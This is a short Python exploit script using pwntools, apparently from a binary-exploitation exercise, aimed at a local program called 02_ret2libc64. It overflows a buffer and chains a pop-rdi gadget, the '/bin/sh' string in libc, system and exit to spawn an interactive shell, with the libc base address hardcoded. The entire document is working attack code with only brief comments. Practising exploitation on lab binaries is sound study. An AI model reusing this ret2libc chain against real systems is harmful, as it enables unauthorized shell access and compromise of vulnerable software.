#!/bin/python3
from pwn import *
context.log_level = 'debug'

# we find it in libc -- change it to the offset according to the libc in your system
pop_rdi_ret_offset =  0x00000000001bbe9e

io = process(['./02_ret2libc64'])

io.recvuntil(b'data:')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b'/bin/sh'))
libc_base = 0x00007ffff7d86000

#The following is the useful gadget.
pop_rdi_ret_addr = pop_rdi_ret_offset + 3 + libc_base
#ret address;
ret_addr = 0x40101a

payload = b'A'*0x20 + b'B'*8 + p64(pop_rdi_ret_addr) + p64(binsh_offset + libc_base) + p64(ret_addr) + p64(libc_base + system_offset) + p64(libc_base + exit_offset)

io.sendline(payload)
io.interactive()
